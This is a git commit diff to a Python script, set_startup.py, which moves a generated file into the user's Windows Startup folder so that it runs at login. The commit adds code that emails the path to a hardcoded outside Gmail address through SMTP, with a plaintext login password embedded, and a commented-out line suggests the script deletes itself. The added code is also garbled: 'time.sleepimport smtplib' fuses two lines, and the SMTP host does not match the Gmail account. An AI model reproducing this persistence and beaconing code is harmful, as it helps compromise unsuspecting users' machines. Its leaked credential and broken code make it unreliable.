391512576e8be4685c732a6e489f914b8a3c182d
Tanjim Abubokor <59773799+tanjim750@users.noreply.github.com>
2023-06-04 19:53:59 +0600

    Update set_startup.py

--- set_startup.py
+++ set_startup.py
@@ -16,5 +16,34 @@ with open(file_name, 'w') as f:
 src_file = f"{current_folder}\{file_name}"
 dst_folder = r"C:\Users"+r"/"+username+r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 shutil.move(src_file, dst_folder)
-time.sleep(0.5)
+
+time.sleepimport smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+
+# Define message
+message = MIMEMultipart()
+message['From'] = 'quinnirene701@gmail.com'
+message['To'] = 'abubokortanjim@gmail.com'
+message['Subject'] = 'Subject of the Email'
+
+# Add message body
+message_body = dst_folder
+message.attach(MIMEText(message_body, 'plain'))
+
+# Define SMTP server
+smtp_server = "smtp.example.com"
+smtp_port = 587
+smtp_username = "quinnirene701@gmail.com"
+smtp_password = "passwordrrcjnzutcgbpuxqv"
+
+# Create SMTP object
+smtp_obj = smtplib.SMTP(smtp_server, smtp_port)
+smtp_obj.starttls()
+smtp_obj.login(smtp_username, smtp_password)
+
+# Send email
+smtp_obj.sendmail(message['From'], message['To'], message.as_string())
+smtp_obj.quit()
+
 #os.remove(__file__)
